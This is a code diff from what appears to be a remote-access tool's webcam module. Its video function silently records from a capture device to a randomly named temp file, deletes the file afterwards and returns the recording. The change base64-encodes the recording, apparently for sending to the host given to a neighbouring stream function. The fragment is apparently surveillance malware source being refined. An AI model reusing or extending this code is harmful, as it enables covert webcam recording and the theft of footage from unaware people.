@@ -43,6 +43,7 @@ def image(*args, **kwargs):
     except Exception as e:
         return '{} error: {}'.format(image.__name__, str(e))
 
+
 def video(*args, **kwargs):
     try:
         fpath = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name == 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
@@ -57,13 +58,14 @@ def video(*args, **kwargs):
             if time.time() > end: break
         dev.release()
         with open(fpath, 'rb') as fp:
-            result = fp.read()
+            result = base64.b64encode(fp.read())
         try:
             util.delete(fpath)
         except: pass
         return result
     except Exception as e:
         return '{} error: {}'.format(video.__name__, str(e))
+
 
 def stream(host=None, port=None, retries=5):
     try:
